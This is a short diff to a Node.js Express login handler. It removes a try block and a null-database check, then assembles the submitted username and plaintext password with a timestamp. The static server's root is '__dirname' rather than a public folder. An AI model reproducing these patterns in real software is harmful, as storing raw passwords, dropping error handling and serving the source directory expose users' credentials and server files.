@@ -33,12 +33,6 @@ app.use(express.static(__dirname)); // Serve static files from the "public" dire
 app.post('/submit-login', async (req, res) => {
     const { username, password } = req.body;
 
-    try {
-        if (!db) {
-            console.error("Database connection not initialized.");
-            return res.status(500).send('Database connection not initialized.');
-        }
-
         // Create the login data object
         const loginData = { username, password, timestamp: new Date() };
         
